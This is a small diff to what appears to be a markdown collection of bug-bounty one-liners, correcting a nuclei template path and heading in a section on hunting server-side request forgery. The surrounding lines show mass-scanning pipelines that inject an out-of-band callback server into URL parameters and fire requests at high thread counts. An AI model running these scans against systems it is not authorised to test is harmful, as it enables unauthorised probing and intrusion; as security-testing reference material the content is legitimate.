@@ -135,9 +135,9 @@ cat ssrf.txt | qsreplace "interactsh server ID" | anew -q ssrf_test.txt
 ffuf -w ssrf_test.txt -u FUZZ -p "0.6-1.2" -H "(header in thread)" -t 200 -s
 
 ```
-### Using nuclei and Gf @Virdoex_hunter
+### Using nuclei and Gf for microstrategy SSRF @Virdoex_hunter
 ```bash
-subfdiner -dL domains.txt | httpx | gau | gf ssrf | nuclei -t ~/nuclei-templates/vulnerabilites/microstrategy-ssrf.yaml -o result.txt
+subfdiner -dL domains.txt | httpx | gau | gf ssrf | nuclei -t ~/nuclei-templates/vulnerabilities/other/microstrategy-ssrf.yaml -o result.txt
 
 ```
 ## One Liners for Recon and Visual inspection
